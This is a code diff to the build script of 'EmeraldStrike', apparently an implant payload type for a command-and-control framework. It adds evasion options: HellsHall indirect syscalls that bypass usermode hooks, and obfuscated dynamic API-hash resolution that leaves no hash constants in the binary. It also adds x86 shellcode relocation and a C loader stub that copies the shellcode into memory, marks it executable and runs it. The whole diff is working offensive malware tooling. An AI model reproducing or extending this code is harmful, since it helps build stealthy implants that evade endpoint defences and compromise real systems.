@@ -182,6 +182,24 @@ class EmeraldStrike(PayloadType):
                 HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="udrl-vs"),
             ],
         ),
+        BuildParameter(
+            name="indirect_syscalls",
+            group_name="Evasion",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="HellsHall indirect syscalls: resolve SSNs from ntdll, execute via random syscall instruction addresses. Bypasses usermode hooks.",
+        ),
+        BuildParameter(
+            name="hash_resolution",
+            group_name="Evasion",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["dynamic", "static"],
+            default_value="dynamic",
+            description="Syscall hash resolution: dynamic (CRC32B computed at runtime from XOR-obfuscated names, no hash constants in the binary) or static (build-time constants)",
+            hide_conditions=[
+                HideCondition(name="indirect_syscalls", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
     ]
 
     build_steps = [
@@ -404,11 +422,20 @@ class EmeraldStrike(PayloadType):
                 with open(bin_path, "rb") as f:
                     shellcode = f.read()
 
+                # x86 has no RIP-relative addressing, so the compiler baked in
+                # absolute addresses resolved against VMA 0. Whoever loads the
+                # shellcode must bias them by the load address. Compute the list
+                # of offsets that need it (x64 needs none - RIP-relative).
+                reloc_offsets = None
+                if arch == "x86":
+                    probe_path = os.path.join(dst_path, "bin", f"emeraldstrike.x86.probe.bin")
+                    reloc_offsets = self._x86_reloc_offsets(bin_path, probe_path)
+
                 if output_type == "bin":
                     resp.payload = shellcode
                     resp.build_message = f"EmeraldStrike {arch} PIC shellcode: {len(shellcode)} bytes"
                 else:
-                    wrapped = await self._wrap_in_pe(shellcode, output_type, arch, agent_build_path, debug)
+                    wrapped = await self._wrap_in_pe(shellcode, output_type, arch, agent_build_path, debug, reloc_offsets)
                     if wrapped is None:
                         resp.status = BuildStatus.Error
                         resp.build_message = "PE wrapping failed"
@@ -605,6 +632,19 @@ class EmeraldStrike(PayloadType):
             defines.append("#define BEACON_GATE_ENABLED 1")
 
         try:
+            indirect_syscalls = self.get_parameter("indirect_syscalls")
+        except Exception:
+            indirect_syscalls = True
+        if indirect_syscalls:
+            defines.append("#define INCLUDE_EVASION_HELLSHALL")
+            try:
+                hash_res = self.get_parameter("hash_resolution")
+            except Exception:
+                hash_res = "dynamic"
+            if hash_res == "dynamic":
+                defines.append("#define HH_HASH_DYNAMIC")
+
+        try:
             http_lib = self.get_parameter("http_library")
         except Exception:
             http_lib = "wininet"
@@ -615,8 +655,87 @@ class EmeraldStrike(PayloadType):
 
         return "\n".join(defines)
 
-    async def _wrap_in_pe(self, shellcode, output_type, arch, build_path, debug=False):
+    def _x86_reloc_offsets(self, shellcode_path, probe_path):
+        """Locate the dwords in the x86 shellcode that hold absolute addresses.
+
+        i686 has no RIP-relative addressing, so clang emits absolute references
+        for static data. The objects are linked at VMA 0, which resolves those
+        references to bare offsets; the loader copies the shellcode to a random
+        base and must add that base back to each one.
+
+        The linker discards the relocation records for a VMA-0 blob, so the list
+        is recovered by linking the same objects a second time at a different
+        VMA (linker_probe.ld) and diffing the two .text images. Every aligned
+        dword that differs by exactly the VMA delta is an absolute address.
+
+        Returns a sorted list of byte offsets, or None if the probe is missing
+        or the two images disagree in a way that is not a pure VMA shift.
+        """
+        try:
+            with open(shellcode_path, "rb") as f:
+                sc = f.read()
+            with open(probe_path, "rb") as f:
+                probe = f.read()
+        except OSError as e:
+            logger.warning(f"x86 relocation probe unavailable: {e}")
+            return None
+
+        if len(sc) != len(probe):
+            logger.warning(
+                f"x86 relocation probe size mismatch ({len(sc)} vs {len(probe)}); "
+                "skipping relocations"
+            )
+            return None
+
+        VMA_DELTA = 0x10000  # matches linker_probe.ld
+        offsets = []
+        # Scan at every byte offset, not just 4-byte boundaries: an absolute
+        # address can sit mid-instruction (e.g. the disp32 of a lea/mov), and a
+        # boundary-aligned scan misses those and corrupts the fixup list.
+        for i in range(0, len(sc) - 3):
+            a = int.from_bytes(sc[i:i + 4], "little")
+            b = int.from_bytes(probe[i:i + 4], "little")
+            if a != b and (b - a) & 0xFFFFFFFF == VMA_DELTA:
+                offsets.append(i)
+
+        # Self-check: replaying the bias over the base image must reproduce the
+        # probe image exactly. If it does not, the list is incomplete and the
+        # payload would fault on the first absolute reference - fail loudly
+        # rather than ship a broken agent.
+        replay = bytearray(sc)
+        for o in offsets:
+            v = int.from_bytes(replay[o:o + 4], "little")
+            replay[o:o + 4] = ((v + VMA_DELTA) & 0xFFFFFFFF).to_bytes(4, "little")
+        if bytes(replay) != probe:
+            logger.error(
+                "x86 relocation list failed self-check (base+delta does not "
+                "reproduce the probe image); refusing to relocate"
+            )
+            return None
+
+        logger.info(f"x86 shellcode: {len(offsets)} absolute addresses to relocate")
+        return offsets
+
+    async def _wrap_in_pe(self, shellcode, output_type, arch, build_path, debug=False,
+                          reloc_offsets=None):
         sc_array = ", ".join(f"0x{b:02x}" for b in shellcode)
+
+        # x86 relocation table: applied by the loader stub after copying the
+        # shellcode, because the compiler's absolute addresses are VMA-0 relative.
+        offsets = reloc_offsets or []
+        off_array = ", ".join(str(o) for o in offsets) if offsets else "0"
+        reloc_code = f"""
+// Absolute-address bias table. Empty (count 0) on x64, which uses RIP-relative
+// addressing and needs no relocation.
+static const unsigned int reloc_offsets[] = {{ {off_array} }};
+#define RELOC_COUNT {len(offsets)}u
+
+static void apply_relocations(unsigned char* base) {{
+    for (unsigned int i = 0; i < RELOC_COUNT; i++) {{
+        *(unsigned int*)(base + reloc_offsets[i]) += (unsigned int)(ULONG_PTR)base;
+    }}
+}}
+"""
 
         try:
             userwx = self.get_parameter("userwx")
@@ -632,12 +751,15 @@ class EmeraldStrike(PayloadType):
 #include <windows.h>
 
 static unsigned char shellcode[] = {{ {sc_array} }};
-
+{reloc_code}
 static void execute_shellcode(void) {{
     LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!mem) return;
     memcpy(mem, shellcode, sizeof(shellcode));
+    // Bias the compiler's VMA-0 absolute addresses by the real load address.
+    // No-op on x64 (RELOC_COUNT == 0).
+    apply_relocations((unsigned char*)mem);
     DWORD old;
     VirtualProtect(mem, sizeof(shellcode), {exec_prot}, &old);
     ((void(*)())mem)();
@@ -727,7 +849,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             "-fpack-struct=8", "-mno-sse", "-masm=intel",
             "-fms-extensions", "-fno-jump-tables",
             f"-I{os.path.join(build_path, 'include')}",
-            "-e", "clr_entry",
+            "-e", "_clr_entry" if arch == "x86" else "clr_entry",
             "-Wl,-s,--strip-all,--enable-stdcall-fixup",
         ] + sysroot_flags
 
@@ -795,7 +917,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             "-fpack-struct=8", "-mno-sse", "-masm=intel",
             "-fms-extensions", "-fno-jump-tables",
             f"-I{os.path.join(build_path, 'include')}",
-            "-e", "bof_entry",
+            "-e", "_bof_entry" if arch == "x86" else "bof_entry",
             "-Wl,-s,--strip-all,--enable-stdcall-fixup",
         ] + sysroot_flags
 
